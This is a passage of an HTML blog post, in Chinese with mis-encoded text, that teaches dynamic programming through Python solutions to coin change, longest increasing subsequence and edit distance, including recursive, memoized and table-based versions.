keyword">if</span> sub <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>  <span class="token comment"># å½“mainå‡½æ•°çš„è¿”å›å€¼ä¸º-1çš„æ—¶å€™ï¼Œè¿™æ¡è·¯èµ°ä¸é€šï¼Œåˆ™æŒ‘å‡ºå¾ªç¯</span>            res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> sub<span class="token punctuation">)</span>  <span class="token comment"># å½“åˆ°äº†æ ‘çš„æœ€ä½ä¸‹ï¼Œä¸Šé¢çš„ifè¯­å¥æ²¡æœ‰æ‰§è¡Œè·³å‡ºå»ï¼Œåˆ™ä½¿res=sub+1</span>        <span class="token keyword">return</span> res <span class="token keyword">if</span> res <span class="token operator">!=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token operator">-</span><span class="token number">1</span>  <span class="token comment"># è¿™æ¡è·¯èµ°çš„é€šï¼Œåˆ™è¿”å›resçš„å€¼ç»™subï¼Œç»“åˆä¸Šé¢çš„ä¸€æ¡è¯­å¥è¿›è¡Œè®¡æ•°</span>    <span class="token keyword">return</span> main<span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token comment"># æœ€åå–å‡ºç¬¬ä¸€ä¸ªé€‰æ‹©çš„é‚£ä¸ªæ•°å­—çš„æ—¶å€™è®¡ç®—å‡ºçš„resæœ€å°å€¼ï¼Œç„¶åå†æŠŠæ¯ä¸ªæ•°å­—çš„æœ€å°å€¼æ‹¿å‡ºæ¥æ¯”è¾ƒå¾—å‡ºæœ€ç»ˆçš„æœ€å°å€¼</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>coinChange<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ä»¥ä¸Šçš„è·¯èµ°çš„é€šçš„æ„æ€æ˜¯èƒ½å¤Ÿå‡‘å‡ºè¿™äº›ç¡¬å¸ï¼Œé€’å½’å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185848166.png" alt loading="lazy"></p><h4 id="å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•-1"><a href="#å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•-1" class="headerlink" title="å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•"></a><strong>å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">coinChange</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> n <span class="token keyword">in</span> memo<span class="token punctuation">:</span>  <span class="token comment"># æŸ¥æ‰¾å¤‡å¿˜å½•ï¼Œé¿å…é‡å¤è®¡ç®—ï¼Œå°±æ˜¯è®¡ç®—ä»¥ä¸Šé¢œè‰²ç›¸åŒçš„éƒ¨åˆ†</span>            <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span>        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        res <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>            sub <span class="token operator">=</span> main<span class="token punctuation">(</span>n <span class="token operator">-</span> coin<span class="token punctuation">)</span>            <span class="token keyword">if</span> sub <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> sub<span class="token punctuation">)</span>        memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>res <span class="token keyword">if</span> res <span class="token operator">!=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">return</span> main<span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>coinChange<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="DP-tableè§£æ³•-1"><a href="#DP-tableè§£æ³•-1" class="headerlink" title="DP tableè§£æ³•"></a><strong>DP tableè§£æ³•</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">-</span> coin <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> coin<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">if</span> dp<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">else</span> dp<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ¼”ç¤ºå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421220220973.png" alt loading="lazy"></p><p>å€Ÿç”¨å¤§ä½¬çš„ä¸€å¥è¯ï¼š</p><p>è®¡ç®—æœºè§£å†³é—®é¢˜å…¶å®æ²¡æœ‰ä»»ä½•å¥‡æŠ€æ·«å·§ï¼Œä»–å”¯ä¸€çš„è§£å†³æ–¹æ³•å°±æ˜¯ç©·ä¸¾ï¼Œç©·ä¸¾æ‰€æœ‰çš„å¯èƒ½æ€§ã€‚ç®—æ³•è®¾è®¡æ— éå°±æ˜¯å…ˆæ€è€ƒâ€œå¦‚ä½•ç©·ä¸¾â€ï¼Œç„¶åå†è¿½æ±‚â€œå¦‚ä½•èªæ˜çš„ç©·ä¸¾â€</p><h3 id="æœ€é•¿é€’å¢å­åºåˆ—"><a href="#æœ€é•¿é€’å¢å­åºåˆ—" class="headerlink" title="æœ€é•¿é€’å¢å­åºåˆ—"></a>æœ€é•¿é€’å¢å­åºåˆ—</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422111536792.png" alt loading="lazy"></p><h4 id="åŠ¨æ€è§„åˆ’è§£æ³•"><a href="#åŠ¨æ€è§„åˆ’è§£æ³•" class="headerlink" title="åŠ¨æ€è§„åˆ’è§£æ³•"></a>åŠ¨æ€è§„åˆ’è§£æ³•</h4><p>åŠ¨æ€è§„åˆ’çš„æ ¸â¼¼è®¾è®¡æ€æƒ³æ˜¯æ•°å­¦å½’çº³æ³•ã€‚</p><p>å‡è®¾å½“ç»“è®ºåœ¨<code>k&lt;n</code>çš„æ—¶å€™æˆç«‹ï¼Œç„¶åæƒ³åŠæ³•è¯æ˜<code>k=n</code>çš„æ—¶å€™ç»“è®ºä¹Ÿæˆç«‹ï¼Œå¦‚æœèƒ½å¤Ÿè¯æ˜çš„å‡ºæ¥ï¼Œé‚£ä¹ˆå°±è¯´æ˜è¿™ä¸ªç»“è®ºå¯¹äºä»»ä½•æ•°éƒ½æˆç«‹ï¼Œå†çœ‹åˆ°è¿™ä¸ªé¢˜ç›®ï¼Œå‡å¦‚æˆ‘ä»¬èƒ½å¤Ÿè¯æ˜ï¼Œæœ€åä¸€ä¸ª<code>nums[i]</code>çš„å€¼å¤§äºå‰ä¸€ä¸ª<code>nums[j]</code>çš„å€¼ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿè¯æ˜å‡ºä»–å’Œ<code>nums[j]</code>æ‰€æ„æˆçš„æœ€é•¿é€’å¢å­åºåˆ—èƒ½å¤Ÿç»“åˆï¼Œéšåå†å°†é•¿åº¦åŠ ä¸€ï¼Œä¸”å°†<code>nums[i]</code>åŠ å…¥åˆ°è¿™ä¸ªæœ€é•¿é€’å¢å­åºåˆ—ä¸­ï¼Œå³ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/gif2.gif" alt loading="lazy"></p><p>ä»£ç å®ç°</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token number">0</span>    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># å®šä¹‰æ¯ä¸€ä½æ•°çš„æœ€é•¿é€’å¢å­åºåˆ—</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># ä»¤æ¯ä¸€ä½çš„åˆå§‹å€¼ä¸º1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># dp[i]è¡¨ç¤ºnums[i]è¿™ä¸ªæ•°ç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¯è§æ—¶é—´å¤æ‚åº¦ä¸ºO(n^2)</p><h4 id="äºŒåˆ†æŸ¥æ‰¾è§£æ³•"><a href="#äºŒåˆ†æŸ¥æ‰¾è§£æ³•" class="headerlink" title="äºŒåˆ†æŸ¥æ‰¾è§£æ³•"></a>äºŒåˆ†æŸ¥æ‰¾è§£æ³•</h4><p>å°†è¾“å…¥çš„åºåˆ—åˆ†æˆè‹¥å¹²å †ï¼Œéœ€è¦éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š</p><p>åªèƒ½æŠŠå°çš„æ•°å­—å‹åˆ°æ¯”å®ƒå¤§çš„æ•°å­—ä¸Šï¼Œä¹Ÿå°±æ˜¯ç”¨å°çš„æ•°å­—è¦†ç›–æ‰åŸæ¥å¤§çš„ï¼Œé‚£ä¹ˆå¦‚ä½•å»å‹å‘¢ï¼Ÿé‚£ä¹ˆå°±çœ‹è¯¥æ•°å­—è¯¥å¦‚ä½•é€‰æ‹©äº†ï¼Œå¦‚æœå½“å‰æ•°å­—è¾ƒå¤§æ²¡æœ‰å¯ä»¥æ”¾ç½®çš„å †ï¼Œé‚£ä¹ˆå°±åœ¨è¾¹ä¸Šæ–°å»ºä¸€ä¸ªå †ï¼Œå†æŠŠæ•°å­—æ”¾è¿›å»ï¼Œå¦‚æœæœ‰å¤šä¸ªå †å¯ä»¥é€‰æ‹©ï¼Œåˆ™é€‰æ‹©è¿™å¤šä¸ªå †ä¸­è€ƒæœ€å·¦è¾¹çš„ä½ç½®ï¼Œä¿è¯å †é¡¶çš„æ•°å­—æ˜¯æœ‰åºçš„äº†ï¼Œå°±åƒè¿™æ ·ï¼ˆAæ˜¯æœ€å¤§çš„ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120140509.png" alt loading="lazy"></p><p>è¿™æ ·å †é¡¶çš„æ•°å­—å°±å¯ä»¥å½¢æˆä¸€ä¸ªæœ€é•¿é€’å¢å­åºåˆ—ï¼Œå½“ç„¶åºåˆ—è‚¯å®šä¸æ­¢ä¸€ä¸ªï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120330841.png" alt loading="lazy"></p><p>èƒ½å¤Ÿä¿è¯å¾—å‡ºæœ€é•¿é€’å¢å­åºåˆ—ï¼Œéšååœ¨æŸ¥æ‰¾è¯¥æ”¾åœ¨å“ªä¸ªå †çš„æ—¶å€™ä½¿ç”¨äºŒåˆ†æ³•æŸ¥æ‰¾å°±å¯ä»¥æé«˜æ•ˆç‡ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    piles <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#å®šä¹‰æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦</span>    top <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># å®šä¹‰æ¯ä¸€ä½æ•°çš„æœ€é•¿é€’å¢å­åºåˆ—</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        top<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># ä»¤æ¯ä¸€ä½çš„åˆå§‹å€¼ä¸º1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        poker <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> piles        <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> top<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> poker<span class="token punctuation">:</span>                right <span class="token operator">=</span> mid            <span class="token keyword">elif</span> top<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> poker<span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid        <span class="token keyword">if</span> left <span class="token operator">==</span> piles<span class="token punctuation">:</span>            piles <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦åŠ ä¸€</span>        top<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> poker    <span class="token keyword">return</span> piles<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="ç¼–è¾‘è·ç¦»"><a href="#ç¼–è¾‘è·ç¦»" class="headerlink" title="ç¼–è¾‘è·ç¦»"></a>ç¼–è¾‘è·ç¦»</h3><p>å…ˆæ¥çœ‹ä¸€ä¸‹é¢˜ç›®æè¿°</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422161419634.png" alt loading="lazy"></p><h4 id="é€’å½’è§£æ³•"><a href="#é€’å½’è§£æ³•" class="headerlink" title="é€’å½’è§£æ³•"></a>é€’å½’è§£æ³•</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> j <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># å‡å¦‚å½“s1å­—ç¬¦ä¸²å¾ªç¯iæ¬¡å¾ªç¯å®Œäº†ï¼Œjè¿˜æœ‰å‰©ä¸‹çš„éƒ¨åˆ†å°±ç›´æ¥å…¨éƒ¨è¿›è¡Œä¸€ä¸ªæ“ä½œj+1æ¬¡å³å¯ï¼Œå› ä¸ºè¿˜å‰©ä¸‹j+1ä¸ªå­—ç¬¦</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># åŒä¸Š</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># è‹¥ç›¸ç­‰ç›´æ¥è·³è¿‡è¿›è¡Œä¸‹ä¸€ä¸ªå­—ç¬¦çš„åˆ¤æ–­</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># æ’å…¥</span>                       dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># æ›¿æ¢</span>                       dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ é™¤</span>    <span class="token keyword">return</span> dp<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ä»¥ä¸Šæ˜¯å°†<code>apple</code>å’Œ<code>add</code>ä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œè½¬æ¢ï¼Œå¾—å‡ºçš„ç»“æœä¸º4ï¼Œå³æ‰€éœ€æ“ä½œçš„æœ€å°å€¼</p><h4 id="å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•-2"><a href="#å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•-2" class="headerlink" title="å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•"></a><strong>å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å¤‡å¿˜å½•</span>    <span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>            <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> j <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># å‡å¦‚å½“s1å­—ç¬¦ä¸²å¾ªç¯iæ¬¡å¾ªç¯å®Œäº†ï¼Œjè¿˜æœ‰å‰©ä¸‹çš„éƒ¨åˆ†å°±ç›´æ¥å…¨éƒ¨è¿›è¡Œä¸€ä¸ªæ“ä½œj+1æ¬¡å³å¯ï¼Œå› ä¸ºè¿˜å‰©ä¸‹j+1ä¸ªå­—ç¬¦</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># åŒä¸Š</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># è‹¥ç›¸ç­‰ç›´æ¥è·³è¿‡è¿›è¡Œä¸‹ä¸€ä¸ªå­—ç¬¦çš„åˆ¤æ–­</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># æ’å…¥</span>                               dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># æ›¿æ¢</span>                               dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ é™¤</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> dp<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token 